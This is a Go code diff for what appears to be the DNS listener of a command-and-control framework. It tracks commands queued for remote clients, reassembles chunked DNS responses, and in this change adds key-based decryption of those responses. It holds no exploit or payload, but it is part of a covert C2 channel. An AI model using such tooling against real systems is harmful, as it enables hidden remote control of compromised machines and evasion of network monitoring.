@@ -1,11 +1,12 @@
-package dnsListener
+package encryptedDNSListener
 
 import (
-	"encoding/hex"
 	"fmt"
 	"sort"
 	"strconv"
 	"sync"
+
+	"github.com/c-sto/Jaqen/libJaqen/server/util"
 )
 
 /*
@@ -25,6 +26,7 @@ type dnsresponse struct {
 	Chunks      []dnschunk
 	TotalChunks int64
 	ReadChunks  int64
+	Key         []byte
 }
 
 type dnschunk struct {
@@ -32,54 +34,54 @@ type dnschunk struct {
 	Num  int64
 }
 
-type DNSCommand struct {
+type dnsCommand struct {
 	Command  string
 	UID      string
 	CmdID    string
 	Response dnsresponse
 }
 
-type dnscommandManager struct {
-	commandMap     map[string]DNSCommand
+type dnsCommandManager struct {
+	commandMap     map[string]dnsCommand
 	cMMutex        *sync.RWMutex
 	waitingCommand string
 }
 
-func (cm *dnscommandManager) Init() {
-	cm.commandMap = make(map[string]DNSCommand)
+func (cm *dnsCommandManager) Init() {
+	cm.commandMap = make(map[string]dnsCommand)
 	cm.cMMutex = &sync.RWMutex{}
 
 }
 
-func (cm dnscommandManager) GetCommandToSend() string {
+func (cm dnsCommandManager) GetCommandToSend() string {
 	cm.cMMutex.RLock()
 	defer cm.cMMutex.RUnlock()
 	return cm.waitingCommand
 }
 
-func (cm *dnscommandManager) GetCommand(c string) DNSCommand {
+func (cm *dnsCommandManager) GetCommand(c string) dnsCommand {
 	cm.cMMutex.RLock()
 	defer cm.cMMutex.RUnlock()
 	if v, ok := cm.commandMap[c]; ok {
 		return v
 	}
-	return DNSCommand{}
+	return dnsCommand{}
 }
 
-func (cm *dnscommandManager) ClearCommand(c string) {
+func (cm *dnsCommandManager) ClearCommand(c string) {
 	cm.cMMutex.Lock()
 	defer cm.cMMutex.Unlock()
 	delete(cm.commandMap, c)
 }
 
-func (cm *dnscommandManager) SetCommandToSend(s string) {
+func (cm *dnsCommandManager) SetCommandToSend(s string) {
 	cm.cMMutex.Lock()
 	defer cm.cMMutex.Unlock()
 	cm.waitingCommand = s
 }
 
 //uuid == cmdid
-func (cm *dnscommandManager) UpdateCmd(uuid, maxchunks, thischunk, vals string) {
+func (cm *dnsCommandManager) UpdateCmd(uuid, maxchunks, thischunk, vals string) {
 	cm.cMMutex.Lock()
 	defer cm.cMMutex.Unlock()
 	c, ok := cm.commandMap[uuid]
@@ -106,13 +108,14 @@ func (cm *dnscommandManager) UpdateCmd(uuid, maxchunks, thischunk, vals string) 
 
 }
 
-func (cm *dnscommandManager) AddCommand(c DNSCommand) {
+func (cm *dnsCommandManager) AddCommand(c dnsCommand) {
 	cm.cMMutex.Lock()
 	defer cm.cMMutex.Unlock()
 	cm.commandMap[c.UID] = c
 }
 
 func (r *dnsresponse) AddChunk(cnum int64, val string) {
+	//check for existing chunk
 	for _, x := range r.Chunks {
 		if x.Num == cnum {
 			return
@@ -122,7 +125,7 @@ func (r *dnsresponse) AddChunk(cnum int64, val string) {
 	r.ReadChunks++
 }
 
-func (cm *dnscommandManager) IsDone(cmdId string) bool {
+func (cm *dnsCommandManager) IsDone(cmdId string) bool {
 	c := cm.GetCommand(cmdId).Response
 	return c.IsDone()
 }
@@ -147,7 +150,9 @@ func (r dnsresponse) ReadResposne() string {
 		rval += x.Body
 	}
 
-	v, e := hex.DecodeString(rval)
+	v, e := util.DecryptHexStringToString(rval, r.Key) //hex.DecodeString(rval)
+
+	//util.Decrypt
 	if e != nil {
 		fmt.Println("ReadResponse Error:", e)
 	}
